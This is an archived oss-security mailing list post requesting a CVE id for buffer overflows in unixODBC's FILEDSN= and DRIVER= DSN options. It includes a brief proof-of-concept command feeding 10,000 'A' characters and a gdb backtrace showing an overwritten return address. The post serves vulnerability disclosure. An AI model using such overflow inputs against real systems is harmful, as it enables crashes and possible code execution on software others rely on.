X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/05/29/7
Message-ID: <CA+5g0S+Gbx7M54nCCKHM067NGi+JRxXrYRdQHs1C+aYsLKH7Ow@mail.gmail.com>
Date: Tue, 29 May 2012 09:42:42 -0300
From: Felipe Pena <felipensp@...il.com>
To: oss-security@...ts.openwall.com
Subject: CVE id request: Multiple buffer overflow in unixODBC
Content-Type: text/plain; charset=utf-8

Hi, please assign a CVE id for the issue:

Multiple buffer overflow in unixODBC
===========================

The library unixODBC doesn't check properly the input from FILEDSN=,
DRIVER= options in the DSN,
which causes buffer overflow when passed to the SQLDriverConnect() function.

The unixODBC maintainer has been notified about the issue.

Version affected
============

FILEDSN= as of 2.0.10
DRIVER= as of 2.3.1

PoC
===

$ ./poc "FILEDSN=$(python -c "print 'A'*10000")"
Segmentation fault

(gdb) bt
 #0  0x00007ffff7bc8c81 in SQLReadFileDSN (pszFileName=<value optimized
 out>, pszAppName=<value optimized out>, pszKeyName=<value optimized
 out>,
    pszString=<value optimized out>, nString=<value optimized out>,
 pnString=<value optimized out>) at SQLReadFileDSN.c:207
 #1  0x4141414141414141 in ?? ()


CREDITS
=======

This bug was discovered by Felipe Pena.
BugSec Team - http://www.bugsec.com.br/
